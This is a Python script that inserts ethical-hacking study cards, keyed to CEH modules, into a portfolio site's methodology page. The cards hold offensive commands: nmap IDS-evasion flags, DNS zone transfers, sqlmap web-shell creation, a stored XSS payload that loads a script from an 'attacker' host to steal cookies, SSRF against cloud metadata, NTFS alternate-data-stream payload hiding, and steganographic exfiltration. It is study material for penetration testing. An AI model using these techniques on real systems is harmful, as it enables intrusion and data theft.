import os

html_file = r"d:\abdo_portfolio\main\templates\main\methodology.html"

with open(html_file, 'r', encoding='utf-8') as f:
    html = f.read()

injections = {
    'meth-content-p0': """
        <!-- CEH Recon Injection -->
        <div class="cyber-card" style="border-top: 2px solid #00e5ff; margin-top:20px;">
          <div class="card-header"><h3 style="color:#00e5ff;">🌐 Advanced Footprinting (Maltego & DNS) [CEH Mod 2]</h3></div>
          <p style="font-size:0.85rem; color:var(--text-secondary);">Go beyond simple Whois. Map the entire organizational relationships.</p>
          <ul class="t-check-list">
            <li>✔ <strong>Maltego:</strong> Use Transforms to graph domains, emails, and ASNs visually. This reveals hidden corporate infrastructure and third-party dependencies.</li>
            <li>✔ <strong>DNS Zone Transfer:</strong> Attempt <code>dig axfr @ns1.target.com target.com</code>. If successful, you map their entire internal/external subdomains instantly.</li>
            <li>✔ <strong>OSINT & Social Engineering:</strong> Scrape LinkedIn for employee structures, identifying targets for spear-phishing campaigns.</li>
          </ul>
        </div>
""",
    'meth-content-p1': """
        <!-- CEH Scanning Injection -->
        <div class="cyber-card border-neon" style="margin-top:20px;">
          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">🛡️</span> IDS/Firewall Evasion & Extended Enum [CEH Mod 3,4]</h3></div>
          <p style="font-size:0.85rem; color:var(--text-secondary);">Modern networks drop loud Nmap scans. Use these evasion and protocol enumeration techniques:</p>
          <div class="table-wrapper"><table class="interactive-table">
            <thead><tr><th>Technique</th><th>Command</th><th>Purpose</th></tr></thead>
            <tbody>
              <tr><td>Packet Fragmentation</td><td><code>nmap -f -sS target</code></td><td>Splits TCP headers over multiple packets to bypass simple IDS filters.</td></tr>
              <tr><td>Decoy Scanning</td><td><code>nmap -D RND:10 target</code></td><td>Hides your IP among 10 randomly generated IPs. The firewall sees 11 scans.</td></tr>
              <tr><td>Custom Packets (Hping3)</td><td><code>hping3 -S -p 80 -c 5 target</code></td><td>Send custom crafted TCP/UDP packets. Excellent for Firewall rule testing and DoS simulation.</td></tr>
              <tr><td>SNMP Enum</td><td><code>snmpwalk -v2c -c public target</code></td><td>Dump routing tables, installed software, and user accounts if the community string is default.</td></tr>
              <tr><td>LDAP Enum</td><td><code>ldapsearch -x -h target -b "dc=target,dc=local"</code></td><td>Dump Active Directory users without authentication (if misconfigured).</td></tr>
            </tbody>
          </table></div>
        </div>
""",
    'meth-content-p5': """
        <!-- CEH Web Injection -->
        <div class="cyber-card" style="margin-top:20px;">
          <div class="card-header"><h3 style="color:#00d9ff;">🕸️ OWASP Top 10 Core Vectors [CEH Mod 8]</h3></div>
          <p style="font-size:0.85rem; color:var(--text-secondary);">A Web Pentester must test for the core OWASP vulnerabilities systematically.</p>
          <div class="cmd-grid" style="grid-template-columns: 1fr 1fr;">
            <div class="cmd-card" style="border-left: 3px solid #f59e0b;">
              <strong style="color:#f59e0b;">SQLi to RCE</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Don't just extract data. Use <code>sqlmap --os-shell</code> (if DBA privs exist) to write a PHP web shell directly to the server via SQL injection.</p>
            </div>
            <div class="cmd-card" style="border-left: 3px solid #ff0055;">
              <strong style="color:#ff0055;">XSS (Cross-Site Scripting)</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Stored XSS can compromise an admin. Inject <code>&lt;script src="http://attacker/hook.js"&gt;&lt;/script&gt;</code> to hijack their session cookie or hook their browser (BeEF).</p>
            </div>
            <div class="cmd-card" style="border-left: 3px solid #9b59ff;">
              <strong style="color:#9b59ff;">SSRF (Server-Side Request Forgery)</strong>
              <p style="font-size:0.8rem; margin:5px 0;">Force the web server to query internal network services (like AWS metadata <code>169.254.169.254</code>) on your behalf.</p>
            </div>
          </div>
        </div>
""",
    'meth-content-p_redteam': """
        <!-- CEH Malware & Crypto Injection -->
        <div class="cyber-card" style="border-top: 2px solid #ff9a56; margin-top:20px;">
          <div class="card-header"><h3 style="color:#ff9a56;">🦠 Malware, Steganography & Crypto [CEH Mod 7, 10]</h3></div>
          <p style="font-size:0.85rem; color:var(--text-secondary);">Advanced techniques for Persistence, Data Exfiltration, and Anti-Forensics.</p>
          
          <div class="rd-checklist-wrap">
            <div id="checklist-p_ceh_post">
              <div class="rd-check-item" onclick="this.classList.toggle('checked')"><div class="rd-check-box"></div>
                <div><strong>Fileless Malware & Living off the Land:</strong> Avoid dropping <code>.exe</code> files. Use native tools like PowerShell or WMI to execute malicious payloads purely in memory (e.g., Invoke-Obfuscation).</div>
              </div>
              <div class="rd-check-item" onclick="this.classList.toggle('checked')"><div class="rd-check-box"></div>
                <div><strong>Alternate Data Streams (ADS):</strong> In NTFS, hide your payload behind a legitimate file: <code>type payload.exe > normal.txt:hidden.exe</code>. Execute via <code>wmic process call create normal.txt:hidden.exe</code>.</div>
              </div>
              <div class="rd-check-item" onclick="this.classList.toggle('checked')"><div class="rd-check-box"></div>
                <div><strong>Steganography:</strong> Hide stolen intellectual property inside image files (e.g., using OpenStego) before exfiltrating, avoiding DLP (Data Loss Prevention) flags.</div>
              </div>
              <div class="rd-check-item" onclick="this.classList.toggle('checked')"><div class="rd-check-box"></div>
                <div><strong>Cryptography (Cryptanalysis):</strong> Understand Birthday Attacks against weak hashing algorithms (MD5/SHA1), and exploit poorly implemented Initialization Vectors (IVs) in symmetric encryption.</div>
              </div>
            </div>
          </div>
        </div>
"""
}

# Apply injections
for section_id, injection_code in injections.items():
    id_pos = html.find(f'id="{section_id}"')
    if id_pos != -1:
        # Find the NEXT closing of the view, which is right before the mark-complete-btn
        button_pos = html.find('<button class="mark-complete-btn"', id_pos)
        if button_pos != -1:
            html = html[:button_pos] + injection_code + "\n        " + html[button_pos:]
            print(f"Injected into {section_id}")
        else:
            print(f"Could not find mark-complete-btn for {section_id}")
    else:
        print(f"Could not find section {section_id}")

with open(html_file, 'w', encoding='utf-8') as f:
    f.write(html)

print("CEH injections applied successfully.")
